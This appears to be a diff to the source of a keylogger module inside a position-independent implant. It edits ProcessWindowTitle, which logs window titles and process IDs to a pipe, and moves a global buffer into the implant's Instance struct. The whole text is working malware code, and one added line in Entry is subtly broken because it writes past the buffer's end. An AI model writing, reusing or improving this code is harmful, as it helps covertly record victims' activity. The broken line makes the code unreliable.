@@ -151,7 +151,6 @@ auto DECLFN CALLBACK WndCallback(
     return Instance->Win32.DefWindowProcW(Window, Message, WParam, LParam);
 }
 
-WCHAR g_TitleBuffer[KEYLOG_BUFFER_LEN + 1] = { 0 };
 
 VOID ProcessWindowTitle()
 {
@@ -177,11 +176,11 @@ VOID ProcessWindowTitle()
         }
 
         // check when ever the title has been changed.
-        if (Instance->Win32.wcsncmp(g_TitleBuffer, Buffer, Instance->Win32.wcslen(Buffer)) != 0)
+        if (Instance->Win32.wcsncmp(Instance->g_TitleBuffer, Buffer, Instance->Win32.wcslen(Buffer)) != 0)
         {
-            memcpy(g_TitleBuffer, Buffer, sizeof(Buffer));
+            memcpy(Instance->g_TitleBuffer, Buffer, sizeof(Buffer));
 
-            Instance->Win32.swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, g_TitleBuffer);
+            Instance->Win32.swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, Instance->g_TitleBuffer);
 
             if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Title, Instance->Win32.wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL))
             {
@@ -389,6 +388,7 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
     Instance.Start      = StartPtr();
     Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
     Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;
+    Instance.g_TitleBuffer[KEYLOG_BUFFER_LEN + 1] = {0};
 
     LoadEssentials( &Instance );
 
